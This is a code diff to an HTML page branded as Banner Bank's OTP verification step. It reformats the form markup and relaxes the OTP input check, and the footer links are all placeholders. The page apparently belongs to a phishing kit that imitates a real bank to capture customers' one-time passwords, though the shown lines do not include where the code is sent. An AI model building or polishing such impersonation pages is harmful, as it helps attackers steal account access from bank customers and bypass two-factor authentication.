@@ -6,6 +6,7 @@
     <title>Banner Bank OTP Verification</title>
     <link rel="icon" type="image/png" href="images/BANR-icon.png">
     <style>
+        /* CSS remains unchanged */
         body {
             margin: 0;
             padding: 0;
@@ -263,22 +264,21 @@
             <div class="image-section">
                 <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
             </div>
-        <div class="login-section">
-        <form class="otp-form" id="otpForm">
-        <label for="otp">Enter One-Time Password (OTP)</label>
-        <input type="text" id="otp" name="otp" maxlength="6" inputmode="numeric" autocomplete="one-time-code" aria-describedby="otp-error" />
-        <div id="otp-error" class="error-message" role="alert">Please enter a valid 6-digit OTP.</div>
-        <button type="submit" class="submit-btn">Verify OTP</button>
-    </form>
-    </div>
+            <div class="login-section">
+                <form class="otp-form" id="otpForm">
+                    <label for="otp">Enter One-Time Password (OTP)</label>
+                    <input type="text" id="otp" name="otp" maxlength="6" inputmode="numeric" autocomplete="one-time-code" aria-describedby="otp-error" />
+                    <div id="otp-error" class="error-message" role="alert">Please enter a valid OTP.</div>
+                    <button type="submit" class="submit-btn">Verify OTP</button>
+                </form>
             </div>
-            <div class="footer-section">
-                <a href="#">Locations</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Forgot Password</a>
-                <a href="#">Unlock/Forgot Login ID</a>
-                <a href="#">Enroll</a>
-            </div>
+        </div>
+        <div class="footer-section">
+            <a href="#">Locations</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Forgot Password</a>
+            <a href="#">Unlock/Forgot Login ID</a>
+            <a href="#">Enroll</a>
         </div>
     </section>
     <div id="waitPage" role="alert" aria-live="assertive">
@@ -298,7 +298,8 @@
             const submitBtn = document.querySelector('.submit-btn');
             const waitPage = document.getElementById('waitPage');
             
-            if (!/^\d{6}$/.test(otp)) {
+            if (otp.length === 0 || otp.length > 6) {
+                errorMessage.textContent = 'Please enter a valid OTP (up to 6 characters).';
                 errorMessage.classList.add('visible');
                 otpInput.focus();
                 return;
